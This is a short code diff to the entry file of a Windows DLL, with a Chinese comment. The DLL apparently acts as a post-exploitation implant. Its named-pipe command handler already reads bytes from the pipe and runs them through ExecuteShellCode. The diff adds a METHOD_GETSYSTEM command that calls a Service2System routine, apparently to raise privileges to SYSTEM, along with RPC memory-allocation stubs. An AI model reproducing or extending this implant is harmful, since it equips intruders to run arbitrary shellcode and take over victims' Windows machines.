@@ -1,5 +1,5 @@
 ﻿// dllmain.cpp : 定义 DLL 应用程序的入口点。
-#include "pch.h"
+#include "service2system.h"
 #include "utils.h"
 #include "global.h"
 #include "wmi.h"
@@ -9,6 +9,19 @@
 #include <corecrt_wstdio.h>
 
 DWORD dwThreadId = 0;
+LPWSTR g_pwszCommandLine = NULL;
+
+
+void* __RPC_USER midl_user_allocate(size_t size)
+{
+    return malloc(size);
+}
+
+// Memory deallocation function for RPC.
+void __RPC_USER midl_user_free(void* p)
+{
+    free(p);
+}
 
 DWORD HandleCode(VOID) {
     HANDLE hPipe;
@@ -53,6 +66,10 @@ DWORD HandleCode(VOID) {
             case METHOD_SHELL_CODE_LOADE:
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                 ExecuteShellCode(szBuffer, dwLen);
+                break;
+            case METHOD_GETSYSTEM:
+                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
+                Service2System(char2wchar(szBuffer));
                 break;
             default:
 
